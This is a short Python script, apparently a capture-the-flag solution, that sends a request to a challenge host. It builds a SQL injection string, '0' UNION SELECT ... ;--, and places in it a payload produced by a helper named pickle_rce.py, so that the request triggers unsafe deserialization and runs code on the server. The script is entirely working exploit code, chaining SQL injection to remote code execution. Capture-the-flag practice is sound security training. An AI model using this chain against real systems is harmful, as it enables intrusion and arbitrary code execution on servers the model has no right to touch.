import requests
from subprocess import check_output
import sys

URL = "http://challs.htsp.ro:13001"

def req(x, url=URL):
    res = requests.get(f"{url}/{x}")
    return res.text

a = check_output(['python3', 'pickle_rce.py', sys.argv[1]]).decode()
x = f"""
'0' UNION SELECT '{a}';--
"""
a = req(x)
print(a)